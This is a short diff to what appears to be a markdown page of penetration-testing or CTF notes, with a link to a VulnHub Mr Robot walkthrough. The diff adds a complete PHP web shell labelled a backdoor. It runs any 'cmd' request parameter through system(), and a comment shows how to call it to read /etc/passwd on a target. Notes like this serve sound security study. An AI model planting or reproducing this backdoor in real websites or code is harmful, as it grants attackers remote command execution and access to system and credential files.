@@ -116,6 +116,12 @@ sudo -i
 
 https://gist.github.com/sente/4dbb2b7bdda2647ba80b
 
+```php
+<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
+<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+```
+
 ## WalkThroughs
 
  - [MrRobot](https://securitybytes.io/vulnhub-com-mr-robot-1-ctf-walkthrough-7d4800fc605a)
